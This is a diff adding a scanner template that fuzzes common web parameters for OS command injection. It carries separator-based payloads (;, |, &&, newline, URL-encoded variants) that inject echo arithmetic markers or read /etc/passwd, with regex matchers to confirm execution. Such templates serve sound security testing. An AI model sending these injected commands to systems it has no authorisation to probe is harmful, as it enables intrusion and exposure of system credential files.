@@ -1,0 +1,61 @@
+id: fuzz-param-rce
+name: Remote Code Execution - Parameter Fuzzing
+version: 1.0
+author: Phantom Team
+severity: medium
+description: >
+  Fuzzes common parameter names with OS command injection payloads using
+  various command separators and encoding techniques. Checks for arithmetic
+  evaluation markers and /etc/passwd content to confirm command execution.
+
+tags:
+  - rce
+  - command-injection
+  - fuzzing
+  - parameter-discovery
+
+requests:
+  - method: GET
+    path:
+      - "/?cmd={{payload}}"
+      - "/?exec={{payload}}"
+      - "/?command={{payload}}"
+      - "/?host={{payload}}"
+      - "/?ip={{payload}}"
+      - "/?domain={{payload}}"
+      - "/?ping={{payload}}"
+      - "/?query={{payload}}"
+      - "/?input={{payload}}"
+      - "/?target={{payload}}"
+      - "/?action={{payload}}"
+      - "/?run={{payload}}"
+      - "/?file={{payload}}"
+      - "/?path={{payload}}"
+
+    attack: batteringram
+    payloads:
+      payload:
+        - "echo%20AGIYMZ$((282037%2B31337))$(echo%20AGIYMZ)AGIYMZ"
+        - "%20echo%20AGIYMZ$((282037%2B31337))$(echo%20AGIYMZ)AGIYMZ"
+        - ";echo%20AGIYMZ$((282037%2B31337))$(echo%20AGIYMZ)AGIYMZ"
+        - "&echo%20AGIYMZ$((282037%2B31337))$(echo%20AGIYMZ)AGIYMZ"
+        - "|echo%20AGIYMZ$((282037%2B31337))$(echo%20AGIYMZ)AGIYMZ"
+        - "||echo%20AGIYMZ$((282037%2B31337))$(echo%20AGIYMZ)AGIYMZ"
+        - "&&echo%20AGIYMZ$((282037%2B31337))$(echo%20AGIYMZ)AGIYMZ"
+        - "%0aecho%20AGIYMZ$((282037%2B31337))$(echo%20AGIYMZ)AGIYMZ"
+        - "%3Becho%20AGIYMZ$((282037%2B31337))$(echo%20AGIYMZ)AGIYMZ"
+        - "%26echo%20AGIYMZ$((282037%2B31337))$(echo%20AGIYMZ)AGIYMZ"
+        - "%26%26echo%20AGIYMZ$((282037%2B31337))$(echo%20AGIYMZ)AGIYMZ"
+        - "%7Cecho%20AGIYMZ$((282037%2B31337))$(echo%20AGIYMZ)AGIYMZ"
+        - "%7C%7Cecho%20AGIYMZ$((282037%2B31337))$(echo%20AGIYMZ)AGIYMZ"
+        - "%26%26cat${IFS}/etc/passwd"
+        - "%26%26cat /etc/passwd"
+
+    matchers:
+      - type: regex
+        regex:
+          - "root:[x*]:0:0:"
+          - "AGIYMZ313374AGIYMZAGIYMZ"
+        condition: or
+
+stop-at-first-match: true
